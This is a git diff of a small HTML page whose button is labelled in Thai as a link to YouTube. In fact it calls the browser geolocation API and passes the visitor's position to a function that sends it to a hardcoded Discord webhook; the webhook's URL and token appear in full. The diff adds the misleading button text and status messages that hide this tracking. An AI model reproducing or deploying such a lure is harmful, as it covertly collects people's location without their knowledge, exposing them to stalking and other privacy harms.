@@ -2,18 +2,18 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>skibidi/title>
+  <title>Skidibi To Welcome</title>
 </head>
 <body>
-  <h2>📍 </h2>
-  <button onclick="getLocation()">📤 </button>
+  <h2>📍 Welcome</h2>
+  <button onclick="getLocation()">📤 กดเพื่อไป youtube</button>
   <p id="status">ยังไม่มีการส่งข้อมูล</p>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
 
     function getLocation() {
-      document.getElementById("status").innerText = "⏳ ...";
+      document.getElementById("status").innerText = "⏳ กําลังไป..";
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
       } else {
